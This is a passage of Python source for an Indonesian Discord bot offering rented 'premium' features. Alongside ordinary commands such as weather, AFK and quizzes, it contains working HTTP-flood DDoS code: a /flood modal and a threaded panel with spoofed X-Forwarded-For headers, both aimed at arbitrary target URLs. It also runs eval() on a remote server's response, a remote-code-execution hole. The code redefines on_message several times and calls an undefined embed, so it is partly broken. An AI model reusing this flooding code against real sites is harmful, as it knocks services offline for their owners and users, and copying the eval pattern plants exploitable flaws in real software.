    embed.add_field(name="Total Members", value=total_members, inline=True)
    embed.add_field(name="Total Channels", value=total_channels, inline=True)
    embed.add_field(name="Total Roles", value=total_roles, inline=True)
    embed.add_field(name="Owner", value=f"{owner} ({owner.id})", inline=False)
    embed.set_footer(text="Stats requested by Owner", icon_url=ctx.author.avatar.url if ctx.author.avatar else "")
    if icon_url:
        embed.set_thumbnail(url=icon_url)

    await ctx.send(embed=embed)
 
#cekcuaca
@bot.command()
async def cekcuaca(ctx, *, location: str = None):
    if location is None:
        await ctx.send("Masukkan nama lokasi!\nContoh: .cekcuaca Jakarta")
        return

    # URL untuk API cuaca
    url = f"https://fastrestapis.fasturl.cloud/search/bmkgweather?location={location}"

    try:
        # Mengambil data cuaca dari API
        response = requests.get(url)
        data = response.json()

        # Memeriksa apakah data valid
        if data['status'] != 200 or data['content'] != 'Success':
            await ctx.send("Gagal mengambil data cuaca!")
            return

        # Mengambil informasi cuaca dari JSON
        cuaca = data['result']['presentWeather']['data']['cuaca']
        lokasi_info = data['result']['presentWeather']['data']['lokasi']

        # Membuat embed untuk cuaca
        embed = embed(title=f"Cuaca Saat Ini - {lokasi_info['kotkab']}, {lokasi_info['provinsi']}", color=0x00FF00)
        embed.add_field(name="Lokasi", value=f"{lokasi_info['desa']}, {lokasi_info['kecamatan']}", inline=False)
        embed.add_field(name="Cuaca", value=cuaca['weather_desc'], inline=False)
        embed.add_field(name="Suhu", value=f"{cuaca['t']}°C", inline=False)
        embed.add_field(name="Kelembapan", value=f"{cuaca['hu']}%", inline=False)
        embed.add_field(name="Arah Angin", value=f"{cuaca['wd']} → {cuaca['wd_to']} ({cuaca['ws']} km/jam)", inline=False)
        embed.add_field(name="Jarak Pandang", value=cuaca['vs_text'], inline=False)
        embed.add_field(name="Terakhir Diperbarui", value=cuaca['local_datetime'], inline=False)
        
        # Menambahkan gambar cuaca ke embed
        embed.set_image(url=cuaca['image'])
        
        # Mengirim embed ke channel
        await ctx.send(embed=embed)

    except Exception as e:
        print(e)
        await ctx.send("Terjadi kesalahan saat mengambil data cuaca.")
        
# SISTEM MENU
@bot.command()
async def allmenu(ctx):
    menu_text = """
**✧━━━━━━━━━[ *Menu* ]━━━━━━━━━━✧**
    
  1. `/spam`
  2. `/plays <judul>`
  3. `/noted`
  4. `/speedtest`
  5. `/limit`
  7. `/toanime`
  8. `/tourl` 
  9. `/anime <judul anime>` 
10. `/countjam <jam>`
11. `/reaksi <pesan: id_pesan:>`
12. `/crash`
13. `/ai <pertanyaan>`
14. `/hd <foto>`
15. `/hdvideo <video>`
16. `/mcserver <alamat ip server>`
17. `/rule34 <nama karakter>`
18. `/judol`
19. `/jarak <kota A ke kota B>`
20. `/dbdaftar`
21. `/memeee`
22. `/ssweb <untuk desktop>`
23. `/quoteimg <pesan>`
24. `/produk <jualan hazelnut>`
25. `/pindl <url>`
26. `/serverr`
27. `/pollgc Judul Polling|Opsi1|Opsi2|... (maks 10 opsi)`
28. `/pollch Judul Polling|Opsi1|Opsi2|JumlahVote1|JumlahVote2`
29. `/telegraph <foto>`
30. `/ig <url>`
31. `/surah <surah> <ayat>`
32. `/topmessage`
33. `/urltourl <url> | alias`
34. `/cekcuaca <lokasi>
35. `/hacking`
36. `/permainan`
37. `/stalker`
38. `/downloader`
39. `/wibu`
40. `/owner`
41. `/cektagihanpln`

**✧━━━━━━━[ *Premium* ]━━━━━━━━━✧**

1. `/xnxx <premium access>`
2. `/cecan <premium access>`
3. `/cpanel <premium access>`
4. `/getnumber <premium access>`
5. `/paptt <premium access>`
6. `/pairing <premium access>`
7. `/otp <premium access>`
8. `/searchhentai <premium access>`
9. `/virtex <user> <premium access>`
10. `/getpp <premium access>`
11. `/webflood <premium access>`
12. `/getsc <premium access>`

**✧━━━━━━━━[ *Group* ]━━━━━━━━━━✧**

1. `/antitoxic on`
2. `/antitoxic off`
3. `/close <channel>`
4. `/open <channel>`
5. `/enble_antilink`
6. `/disable_antilink`
7. `/afkk`

**✧━━━━━━━━[ *Owner* ]━━━━━━━━━━✧**

1. `/invite <owner access>`
2. `/kirim <owner access>`
3. `/reactch <owner access>`
4. `/enable_antilink`
5. `/disable_antilink`
6. `/clearchat`
7. `/serverstast`
8. `/culikaman idasal | id target`

**✧━━━━━━━[ *Thank You* ]━━━━━━━━━✧**
`Pesan otomatis jangan di replay`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1364441222806114354/IMG-20250401-WA0094.png?ex=6809ae69&is=68085ce9&hm=2fa68ac7ada7e285d41e6bb721ad15076dcea6dd05d7dea2656a23d7408e6047&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Antartica Server")

    await ctx.send(embed=embed)

#pln
def is_valid_id(id):
    if not id:
        return False, 'ID Pelanggannya wajib diisi anjirr!'
    if not id.isdigit():
        return False, 'ID Pelanggan harus angka semua bre!'
    if len(id) != 12:
        return False, 'ID Pelanggan kudu 12 digit ya bree.'
    return True, None

def generate_hash(appidn, id, yyy):
    try:
        c = f"{appidn}|rocks|{id}|watu|{yyy}"
        hashx = hashlib.md5(c.encode()).hexdigest()
        return hashx
    except:
        return None

def rupiah(amount):
    num = int(amount.replace('.', ''))
    return f"Rp {num:,.2f}".replace(",", ".").replace(".", ",", 1)

def parse_response(data):
    if isinstance(data, str):
        for line in data.split('\n'):
            line = line.strip()
            if line.startswith('{'):
                try:
                    return eval(line)
                except:
                    pass
    return data

@bot.command()
async def cektagihanpln(ctx, id_pelanggan: str = None):
    if not id_pelanggan:
        return await ctx.send("Masukkan ID Pelanggan PLN (contoh: `!cektagihanpln 123456789012`)")

    valid, error_msg = is_valid_id(id_pelanggan)
    if not valid:
        return await ctx.send(error_msg)

    appidn = "com.tagihan.listrik"
    yyy = str(int(datetime.datetime.now().timestamp()))
    hashx = generate_hash(appidn, id_pelanggan, yyy)

    if not hashx:
        return await ctx.send("Gagal generate hash, coba lagi.")

    url = f"https://pln.onyxgemstone.net/indexplnme.php?idp={id_pelanggan}&appidn={appidn}&yyy={yyy}&xxx={hashx}"
    headers = {
        'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
        'connection': 'Keep-Alive',
        'referer': url
    }

    try:
        r = requests.get(url, headers=headers)
        res = parse_response(r.text)

        if res.get("status") == "error":
            pesan = res.get("pesan", "")
            if "DIBLOKIR" in pesan:
                return await ctx.send(f"ID {id_pelanggan} diblokir bree. Hubungi PLN.")
            elif "TAGIHAN SUDAH TERBAYAR" in pesan:
                return await ctx.send(f"Tagihan ID {id_pelanggan} udah dibayar bree.")
            elif "id YANG ANDA MASUKKAN SALAH" in pesan:
                return await ctx.send(f"ID {id_pelanggan} salah bree. Bukan ID PLN pascabayar.")

        if res.get("status") == "success" and res.get("data"):
            data = res["data"]
            output = "**Informasi Tagihan PLN**\n\n"
            output += f"**ID Pelanggan:** {data['id_pelanggan']}\n"
            output += f"**Nama:** {data['nama_pelanggan']}\n"
            output += f"**Daya:** {data['status_tarifdaya']}\n"
            output += f"**Periode Tagihan:** {data['status_periode']}\n"
            output += f"**Stand Meteran:** {data['standmeteran']}\n"
            output += f"**Total Tagihan:** {rupiah(data['jumlahtagihan'])}\n"
            output += f"**Jumlah Tagihan:** {len(data['status_periode'].split(','))} bulan"
            return await ctx.send(output)

        return await ctx.send("Gagal ambil data tagihan. Coba lagi nanti bree.")
    except Exception as e:
        return await ctx.send(f"Error: {str(e)}")
           
#owner
@bot.command()
async def owner(ctx):
    member = ctx.author

    hour = datetime.now().hour
    greeting = (
        "☀️ Selamat pagi" if 4 <= hour < 10 else
        "🌤️ Selamat siang" if 10 <= hour < 15 else
        "🌇 Selamat sore" if 15 <= hour < 18 else
        "🌙 Selamat malam"
    )

    embed = discord.Embed(
        title=f"Halo {member.name}!",
        description=f"{greeting}, Haloo kak {member.mention}\nmenu owner nya sudah siap silahkan di klik 🤗✨",
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    embed.set_footer(text=f"Bot berjalan di {member.guild.name}")
    embed.timestamp = datetime.now(timezone.utc)

    # Fungsi callback untuk tombol sewa
    async def sewa_callback(interaction):
        # Panggil command sewa ketika tombol diklik
        sewa_command = bot.get_command("sewa")
        if sewa_command:
            await sewa_command(ctx)

    # Fungsi callback untuk tombol TikTok
    async def tiktok_callback(interaction):
        await interaction.response.send_message("Kunjungi TikTok kami di sini: https://tiktok.com/@stc_fay")

    # Fungsi callback untuk tombol WhatsApp
    async def wa_callback(interaction):
        await interaction.response.send_message("Hubungi kami melalui WhatsApp di sini: https://wa.me/+6285183131924")

    # Fungsi callback untuk tombol support
    async def support_callback(interaction):
        await interaction.response.send_message("Hubungi support di sini: https://dana.com/085183131924")

    # tombol sewa, TikTok, WhatsApp, dan support
    view = discord.ui.View()

    button_sewa = discord.ui.Button(label="🤖 Sewa Bot", custom_id="sewa")
    button_sewa.callback = sewa_callback
    view.add_item(button_sewa)

    button_tiktok = discord.ui.Button(label="🎵 TikTok", custom_id="tiktok")
    button_tiktok.callback = tiktok_callback
    view.add_item(button_tiktok)

    button_wa = discord.ui.Button(label="📱 WhatsApp", custom_id="wa")
    button_wa.callback = wa_callback
    view.add_item(button_wa)

    button_support = discord.ui.Button(label="💬 Support", custom_id="support")
    button_support.callback = support_callback
    view.add_item(button_support)

    # Kirim embed + view ke channel tempat command diketik
    await ctx.channel.send(embed=embed, view=view)
    
#sewa
bot_start_time = time.time()  # Menyimpan waktu ketika bot mulai dijalankan

@bot.command()
async def sewa(ctx):
    # Menghitung waktu uptime bot
    uptime_seconds = int(time.time() - bot_start_time)
    uptime = str(timedelta(seconds=uptime_seconds))

    embed = discord.Embed(
        title="✨ Sewa Bot Premium",
        description=(
            "Tingkatkan server kamu dengan fitur premium yang bikin server makin aktif dan menarik! 🚀\n\n"
            "**💸 Harga Sewa:**\n"
            "> 🕐 **Harian** — Rp 5.000 / 1 hari\n"
            "> 📅 **Mingguan** — Rp 15.000 / 7 hari\n"
            "> 🗓️ **Bulanan** — Rp 30.000 / 30 hari\n\n"

            "**⚙️ Fasilitas Premium:**\n"
            "> ✅ Semua fitur aktif tanpa batas\n"
            "> ✏️ Custom prefix & nama bot\n"
            "> 👑 Support langsung dari owner\n"
            "> ⚡ Fast respon & anti delay\n"
            "> ♻️ Update fitur berkala\n"
            "> 🎧 Fitur Musik & Game\n"
            "> 🛡️ Anti Spam & Keamanan\n"
            "> 🖥️ Moderasi Lengkap\n"
            "> 🧩 Integrasi aplikasi lain\n"
            "> 📊 Laporan & Analitik\n"
            "> 💬 Custom Commands\n\n"

            "**📲 Cara Sewa:**\n"
            "Pilih paket dari menu di bawah atau hubungi WhatsApp owner."
        ),
        color=discord.Color.dark_purple()
    )
    embed.add_field(name="⏳ Waktu Uptime Bot", value=uptime, inline=False)
    embed.set_footer(text="X Y N O R A Bot • Terima kasih telah mendukung!", icon_url=ctx.bot.user.avatar.url)
    embed.set_thumbnail(url=ctx.bot.user.avatar.url)
    embed.timestamp = datetime.now(timezone.utc)

    view = discord.ui.View()

    class PaketSewa(discord.ui.Select):
        def __init__(self):
            options = [
                discord.SelectOption(label="Harian", description="Rp 5.000 / 1 hari", emoji="🕐"),
                discord.SelectOption(label="Mingguan", description="Rp 15.000 / 7 hari", emoji="📅"),
                discord.SelectOption(label="Bulanan", description="Rp 30.000 / 30 hari", emoji="🗓️"),
            ]
            super().__init__(placeholder="Pilih paket sewa...", options=options)

        async def callback(self, interaction: discord.Interaction):
            pesan_map = {
                "Harian": "🕐 **Paket Harian**\nTransfer Rp 5.000 ke Dana/Ovo dan kirim bukti ke: https://wa.me/6285183131924",
                "Mingguan": "📅 **Paket Mingguan**\nTransfer Rp 15.000 dan hubungi owner: https://wa.me/6285183131924",
                "Bulanan": "🗓️ **Paket Bulanan**\nTransfer Rp 30.000 lalu kirim bukti ke: https://wa.me/6285183131924",
            }
            await interaction.response.send_message(pesan_map[self.values[0]], ephemeral=True)

    view.add_item(PaketSewa())
    view.add_item(discord.ui.Button(label="📱 WhatsApp Owner", url="https://wa.me/6285183131924"))

    await ctx.send(embed=embed, view=view)
    
#afk
AFK_FILE = "./database/afk.json"
os.makedirs(os.path.dirname(AFK_FILE), exist_ok=True)

def load_afk():
    if os.path.exists(AFK_FILE):
        with open(AFK_FILE, "r") as f:
            return json.load(f)
    return {}

def save_afk(data):
    if data:
        with open(AFK_FILE, "w") as f:
            json.dump(data, f)
    else:
        if os.path.exists(AFK_FILE):
            os.remove(AFK_FILE)

afk_users = load_afk()

@bot.command()
async def afk(ctx, *, reason=None):
    user = ctx.author
    afk_users[str(user.id)] = {
        "reason": reason if reason else "Tidak ada alasan.",
        "start_time": time.time()
    }
    save_afk(afk_users)

    embed = discord.Embed(
        title="AFK",
        description=f"**{user.name}** sekarang AFK: {afk_users[str(user.id)]['reason']}",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    user_id = str(message.author.id)

    if user_id in afk_users:
        afk_data = afk_users.pop(user_id)
        save_afk(afk_users)

        afk_duration = time.time() - afk_data["start_time"]
        minutes = int(afk_duration // 60)
        seconds = int(afk_duration % 60)

        embed = discord.Embed(
            title="Kembali!",
            description=f"**{message.author.name}** sudah tidak AFK lagi.\n"
                        f"**Kamu AFK selama {minutes} menit {seconds} detik.**",
            color=discord.Color.green()
        )
        await message.channel.send(embed=embed)

    # cek jika ada yang mention atau reply ke orang yang AFK
    for user in message.mentions:
        uid = str(user.id)
        if uid in afk_users:
            afk_data = afk_users[uid]
            afk_duration = time.time() - afk_data["start_time"]
            minutes = int(afk_duration // 60)
            seconds = int(afk_duration % 60)

            embed = discord.Embed(
                title="Pemberitahuan AFK",
                description=f"{user.name} sedang AFK\n"
                            f"**Mereka sudah AFK selama {minutes} menit {seconds} detik.**",
                color=discord.Color.orange()
            )
            await message.channel.send(embed=embed)
            break

    await bot.process_commands(message)

#hacking
@bot.command()
async def hacking(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**
    
1. `/course`
2. `/html <url>`
3. `/ddos`
4. `/geolocate`
5. `/finduser`
6. `/whois`
7. `/pastebin <url>`
8. `/sertifikattolol <nama lu>`
9. `/flood`
   
**✧━━━━[ *Thank You* ]━━━━━━✧**
`⚠️ Hacking area, vpn on ⚠️`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1362671538503024691/6642c429a34ce2c4fdbd17bf271e2b6c.jpg?ex=68033e43&is=6801ecc3&hm=174d0c310883f861f64378c4821838371c765fc6a5ece9fc34fdc6aaf0234dc1&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Antartica-Server")

    await ctx.send(embed=embed)
    
#ddos flood
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    'Mozilla/5.0 (Linux; Android 10)',
]

async def attack(target, time_limit, rate):
    from urllib.parse import urlparse
    parsed = urlparse(target)
    end_time = time.time() + time_limit

    async def send_request():
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': '*/*',
            'Referer': target,
            'Connection': 'Keep-Alive'
        }
        url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        try:
            requests.get(url, headers=headers, timeout=5)
        except:
            pass

    while time.time() < end_time:
        tasks = []
        for _ in range(rate):
            tasks.append(asyncio.create_task(send_request()))
        await asyncio.gather(*tasks)

class AttackModal(Modal, title="Custom Attack Settings"):
    target = TextInput(label="Target URL", placeholder="https://example.com", required=True)
    duration = TextInput(label="Duration (seconds)", placeholder="60", required=True)
    rate = TextInput(label="Rate (requests per second)", placeholder="100", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        target = self.target.value
        try:
            duration = int(self.duration.value)
            rate = int(self.rate.value)
        except ValueError:
            await interaction.response.send_message("Duration dan rate harus angka!", ephemeral=True)
            return

        embed = discord.Embed(
            title="Attack Started!",
            description=f"Target: {target}\nTime: {duration} seconds\nRate: {rate} rps",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)
        
        # start attack
        await attack(target, duration, rate)

class AttackButton(Button):
    def __init__(self):
        super().__init__(label="Start Custom Attack", style=discord.ButtonStyle.success)

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(AttackModal())

@bot.command()
async def flood(ctx):
    embed = discord.Embed(
        title="Flood Panel",
        description="Klik tombol di bawah untuk custom serangan.",
        color=discord.Color.blurple()
    )
    view = View()
    view.add_item(AttackButton())
    await ctx.send(embed=embed, view=view)

#sertifikattolol    
@bot.command(name="sertifikattolol")
async def sertifikattolol(ctx, *, text: str = None):
    if not text:
        await ctx.send("namanya siapa ngentod?")
        return

    emaklu = "velyn"
    bokep = f"https://www.velyn.biz.id/api/maker/sertifikatTolol?text={text}&apikey={emaklu}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(bokep) as response:
                if response.status != 200:
                    await ctx.send("Gagal membuat sertifikat.")
                    return
                data = await response.read()
                file = discord.File(fp=BytesIO(data), filename="sertifikat.png")  # Gunakan BytesIO dari io
                await ctx.send(content="*sʏsᴛᴇᴍ ɴᴏᴛɪᴄᴇ* sᴜᴄᴄᴇs....!!", file=file)
    except Exception as e:
        print(e)
        await ctx.send("Gagal membuat sertifikat.")

#otp spam    
@bot.command()
async def pastebin(ctx, url: str = None):
    if not url:
        await ctx.send('❌ *Format salah. Contoh:* `.pastebin https://pastebin.com/xxxxxxxx`')
        return

    try:
        apiUrl = f'https://fastrestapis.fasturl.cloud/downup/pastebindown?url={url}'
        response = requests.get(apiUrl)
        data = response.json()

        if not data or not data.get('status') or not data.get('result') or not data['result'].get('content'):
            await ctx.send('❌ Gagal mengambil kode, pastikan link Pastebin benar dan tidak private.')
            return

        pastebinContent = data['result']['content'].strip()
        if not pastebinContent:
            await ctx.send('❌ Data Pastebin kosong.')
            return

        # Membuat embed untuk menampilkan konten
        embed = discord.Embed(title="📋 Isi Pastebin", description=pastebinContent, color=discord.Color.blue())
        embed.set_footer(text="Bot Pastebin by X Y N O R A")
        await ctx.send(embed=embed)

    except Exception as e:
        print(e)
        await ctx.send('❌ Terjadi kesalahan saat mengambil data.')
    
# Fitur OSINT untuk mencari IP geolocation
@bot.command()
async def geolocate(ctx, ip: str):
    try:
        # API untuk IP Geolocation
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url)
        response.raise_for_status()  # Menangkap error HTTP jika status bukan 2xx
        data = response.json()

        if data["status"] == "fail":
            await ctx.send("Gagal mendapatkan informasi IP.")
        else:
            location_info = f"""
            IP: {data["query"]}
            Lokasi: {data["city"]}, {data["regionName"]}, {data["country"]}
            Latitude: {data["lat"]}, Longitude: {data["lon"]}
            ISP: {data["isp"]}
            """
            await ctx.send(location_info)
    except requests.exceptions.RequestException as e:
        await ctx.send(f"Terjadi kesalahan saat menghubungi API: {e}")
    except Exception as e:
        await ctx.send(f"Terjadi kesalahan: {e}")

# Fitur OSINT untuk mencari username di berbagai platform (Sherlock-like)
@bot.command()
async def finduser(ctx, username: str):
    try:
        # Gunakan Sherlock atau API lain yang sesuai untuk pencarian username
        # Untuk demo ini, kita hanya melakukan request ke URL tertentu
        search_url = f"https://www.sherlock-api.xyz/api/search/{username}"
        response = requests.get(search_url)
        response.raise_for_status()  # Menangkap error HTTP jika status bukan 2xx
        data = response.json()

        if data['status'] == "success":
            platforms = "\n".join(data['platforms'])
            await ctx.send(f"Username ditemukan di platform berikut:\n{platforms}")
        else:
            await ctx.send("Username tidak ditemukan di platform manapun.")
    except requests.exceptions.RequestException as e:
        await ctx.send(f"Terjadi kesalahan saat menghubungi API: {e}")
    except Exception as e:
        await ctx.send(f"Terjadi kesalahan: {e}")

# Fitur untuk melakukan pencarian Whois domain
@bot.command()
async def whois(ctx, domain: str):
    try:
        url = f"https://whoisapi.com/whois/{domain}"
        response = requests.get(url)
        response.raise_for_status()  # Menangkap error HTTP jika status bukan 2xx
        data = response.json()

        if 'error' in data:
            await ctx.send("Gagal mendapatkan informasi Whois.")
        else:
            whois_info = f"""
            Domain: {data['domainName']}
            Registrar: {data['registrar']}
            Status: {data['status']}
            Creation Date: {data['creationDate']}
            Expiration Date: {data['expirationDate']}
            """
            await ctx.send(whois_info)
    except requests.exceptions.RequestException as e:
        await ctx.send(f"Terjadi kesalahan saat menghubungi API: {e}")
    except Exception as e:
        await ctx.send(f"Terjadi kesalahan: {e}")

#course
def load_questions():
    with open("./api/api-course.json", "r") as file:
        data = json.load(file)
        return data

questions = load_questions()  # load questions from JSON
user_progress = {}

class QuizButton(Button):
    def __init__(self):
        super().__init__(label="Mulai Kuis", style=discord.ButtonStyle.primary)

    async def callback(self, interaction: discord.Interaction):
        user_progress[interaction.user.id] = {"current": 0, "answers": []}
        await send_question(interaction)

async def send_question(interaction):
    progress = user_progress[interaction.user.id]
    current = progress["current"]

    if current < len(questions):
        q = questions[current]["pertanyaan"]
        await interaction.response.send_message(
            embed=discord.Embed(title=f"Kuis Pertanyaan {current + 1}", description=q, color=discord.Color.blue()),
            ephemeral=True
        )
    else:
        await interaction.response.send_message(
            embed=discord.Embed(title="Kuis Selesai!", description="Semua pertanyaan sudah dijawab. Klik tombol untuk buat sertifikat!", color=discord.Color.green()),
            view=CertificateButton(),
            ephemeral=True
        )

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.author.id in user_progress:
        progress = user_progress[message.author.id]
        current = progress["current"]

        if current < len(questions):
            correct_answer = questions[current]["jawaban"].lower()
            if message.content.lower() == correct_answer:
                progress["current"] += 1
                await send_question(await bot.get_channel(message.channel.id).fetch_message(message.id))
            else:
                await message.channel.send(embed=discord.Embed(title="Jawaban Salah!", description="Coba lagi yaa!", color=discord.Color.red()), ephemeral=True)

class CertificateButton(View):
    def __init__(self):
        super().__init__()
        self.add_item(NameModalButton())

class NameModalButton(Button):
    def __init__(self):
        super().__init__(label="Buat Sertifikat", style=discord.ButtonStyle.success)

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(NameModal())

class NameModal(Modal):
    def __init__(self):
        super().__init__(title="Masukkan Nama untuk Sertifikat!")

        self.name = TextInput(label="Nama Lengkap", placeholder="Contoh: Rayhan Saputra", required=True)
        self.add_item(self.name)

    async def on_submit(self, interaction: discord.Interaction):
        name = self.name.value
        image = generate_certificate(name)

        file = discord.File(fp=image, filename="certificate.png")
        await interaction.response.send_message(
            embed=discord.Embed(title="Sertifikat Berhasil Dibuat!", color=discord.Color.gold()).set_image(url="attachment://certificate.png"),
            file=file
        )

def generate_certificate(name):
    # bikin sertifikat sederhana
    width, height = 800, 600
    background_color = (255, 255, 255)
    text_color = (0, 0, 0)

    img = Image.new('RGB', (width, height), background_color)
    d = ImageDraw.Draw(img)

    # font
    try:
        font = ImageFont.truetype("arial.ttf", 40)
    except:
        font = ImageFont.load_default()

    d.text((width/2 - 200, height/2 - 20), f"Sertifikat untuk\n{name}", fill=text_color, align="center", spacing=10)

    # simpan ke memori
    buffer = io.BytesIO()
    img.save(buffer, format="PNG")
    buffer.seek(0)
    return buffer

@bot.command()
async def course(ctx):
    embed = discord.Embed(title="Course Seruuu!", description="Klik tombol di bawah untuk mulai course!", color=discord.Color.blurple())
    await ctx.send(embed=embed, view=View(QuizButton()))

# bot event
@bot.event
async def on_message(message):
    try:
        if message.author.bot:
            return  # Jangan balas pesan bot lain

        msg_text = message.content.lower()
        trigger_words = ['sc burik', 'bot kontol', 'bot jelek', 'bot poke']

        if any(word in msg_text for word in trigger_words):
            await message.reply('jangan nyocot doang lah anjing, coba bikin sendiri poke')

        # Pastikan command tetap bekerja
        await bot.process_commands(message)
    except Exception as e:
        print(f"Auto-reply error: {e}")
             
#sistem ddos
attack_flag = False
attack_threads = []
current_url = None

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def ddos_attack(url, threads=30, delay=0.2):
    global attack_flag
    attack_flag = True

    def flood():
        while attack_flag:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
                }
                requests.get(url, headers=headers, timeout=2)
                time.sleep(delay)
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        attack_threads.append(t)

class DDoSModal(Modal, title="Masukkan URL Target"):
    url_input = TextInput(label="Target URL (https://...)")

    async def on_submit(self, interaction: discord.Interaction):
        global current_url
        current_url = self.url_input.value
        await interaction.response.send_message(f"URL disimpan: `{current_url}`", ephemeral=True)

class DDoSPanel(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Data", style=discord.ButtonStyle.gray)
    async def data_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(DDoSModal())

    @discord.ui.button(label="Start", style=discord.ButtonStyle.green)
    async def start_btn(self, interaction: discord.Interaction, button: Button):
        global current_url, attack_flag
        if not current_url:
            await interaction.response.send_message("URL belum dimasukkan! Klik tombol `Data` dulu.", ephemeral=True)
            return
        if attack_flag:
            await interaction.response.send_message("Serangan sudah berjalan!", ephemeral=True)
            return
        threading.Thread(target=ddos_attack, args=(current_url,)).start()
        await interaction.response.send_message("**DDoS dimulai!**", ephemeral=True)

    @discord.ui.button(label="Stop", style=discord.ButtonStyle.red)
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        global attack_flag
        if attack_flag:
            attack_flag = False
            await interaction.response.send_message("**DDoS dihentikan!**", ephemeral=True)
        else:
            await interaction.response.send_message("Belum ada serangan aktif.", ephemeral=True)

@bot.command(name="panel")
async def panel(ctx):
    await ctx.send("**Panel DDoS** — Klik tombol di bawah:", view=DDoSPanel())

# sistem html brok
def get_html(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Terjadi kesalahan: {str(e)}"

# View buat tombol
class HTMLButtonView(View):
    def __init__(self, url):
        super().__init__()
        self.url = url

    @discord.ui.button(label="Ambil HTML", style=discord.ButtonStyle.primary)
    async def button_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        html = get_html(self.url)
        if "Terjadi kesalahan" in html:
            await interaction.response.send_message(html, ephemeral=True)
        else:
            with open("XYNORABOTZ.html", "w", encoding="utf-8") as f:
                f.write(html)

            embed = discord.Embed(
                title="HTML dari Website",
                description=f"Berikut file HTML dari `{self.url}`",
                color=discord.Color.blue()
            )
            embed.set_footer(text="Diambil otomatis oleh bot.")

            await interaction.response.send_message(
                embed=embed,
                file=discord.File("XYNORABOTZ.html")
            )

            os.remove("XYNORABOTZ.html")

# Command !html
@bot.command()
async def html(ctx, url: str = None):
    if url is None:
        await ctx.send("Tolong kasih URL! contoh: `/html https://example.com`")
    else:
        view = HTMLButtonView(url)
        await ctx.send("Klik tombol di bawah untuk ambil HTML-nya:", view=view)
    
# sistem anti spemm 
user_spam = {}
user_blocked = {}

spam_window = 4  # dalam detik
spam_limit = 5  # batas pesan dalam waktu spam_window
block_time = 30  # waktu blokir dalam detik

@bot.event
async def on_message(message):
    if message.author.bot:
        return  # Abaikan pesan dari bot lain

    sender = str(message.author.id)
    now = time.time()

    # Cek apakah user sedang diblokir
    if sender in user_blocked and now < user_blocked[sender]:
        wait_time = round(user_blocked[sender] - now, 1)
        await message.reply(f"Kamu lagi kena cooldown karena spam. Tunggu {wait_time} detik lagi ya!")
        return

    # Melacak spam user
    if sender not in user_spam:
        user_spam[sender] = []

    # Menambahkan timestamp pesan
    user_spam[sender].append(now)

    # Hapus timestamp yang sudah lebih dari spam_window detik
    user_spam[sender] = [ts for ts in user_spam[sender] if now - ts <= spam_window]

    # Jika jumlah pesan lebih dari batas, blokir user sementara
    if len(user_spam[sender]) >= spam_limit:
        user_blocked[sender] = now + block_time  # Menetapkan waktu blokir
        print(f"User {sender} kena spam filter dan diblokir sementara.")
        await message.reply('Kamu terlalu sering kirim perintah! Coba lagi sebentar lagi ya...')
        return
        
# getsc
load_dotenv(dotenv_path="./database/developer.env")
OWNER_ID = int(os.getenv("DEVELOPER_ID"))
PREMIUM_ROLE = "Premium"
SAMPAH_DIR = "./database/sampah"
ZIP_NAME = "XYNORABotz.zip"
EXCLUDE_FILES = [
    "BACA DULU TOD.md", "channel_id.txt", "antitoxic.json", 
    "channel_config.json", "first_join.json", "test.py"
]

# Command untuk backup script bot
@bot.command(name="getsc")
async def getsc(ctx):
    try:
        # Validasi akses user
        if ctx.author.id != OWNER_ID and PREMIUM_ROLE not in [role.name for role in ctx.author.roles]:
            return await ctx.reply("❌ | Kamu tidak punya akses menggunakan perintah ini!")

        # Kirim pesan embed loading
        embed_loading = discord.Embed(
            title="Backup Script Bot",
            description="⏳ Sedang memproses backup script kamu...",
            color=discord.Color.orange()
        )
        msg = await ctx.reply(embed=embed_loading)

        # Hapus file sampah (kecuali file 'A')
        if os.path.exists(SAMPAH_DIR):
            for file in os.listdir(SAMPAH_DIR):
                if file != "A":
                    os.remove(os.path.join(SAMPAH_DIR, file))
        else:
            await ctx.send("⚠️ | Folder sampah tidak ditemukan, lanjut ke proses backup...")

        # List file yang ingin di-zip (kecuali yang ada di EXCLUDE_FILES)
